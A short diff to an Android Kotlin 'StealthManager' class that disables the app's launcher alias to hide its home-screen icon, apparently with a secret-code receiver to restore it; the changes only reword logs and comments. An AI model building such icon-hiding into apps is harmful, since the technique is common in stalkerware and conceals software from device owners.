@@ -26,19 +26,20 @@ object StealthManager {
             val pkg = context.packageManager
             val aliasName = ComponentName(context, "${context.packageName}.LauncherAlias")
             
-            Log.d(TAG, "Attempting to hide: ${aliasName.flattenToString()}")
+            Log.d(TAG, "Attempting to hide launcher icon: ${aliasName.flattenToString()}")
             
+            // ── Primary Disable ──
             pkg.setComponentEnabledSetting(
                 aliasName,
                 PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
-                PackageManager.DONT_KILL_APP  // CRITICAL: don't kill app process
+                PackageManager.DONT_KILL_APP
             )
             
-            // Save state so SecretCodeReceiver knows the real state
+            // Save state
             context.getSharedPreferences("stealth_prefs", Context.MODE_PRIVATE)
                 .edit().putBoolean("icon_hidden", true).apply()
             
-            Log.i(TAG, "Launcher alias disabled (DONT_KILL_APP)")
+            Log.i(TAG, "Launcher alias disabled successfully (v29)")
         } catch (e: Exception) {
             Log.e(TAG, "Failed to hide launcher icon: ${e.message}")
         }
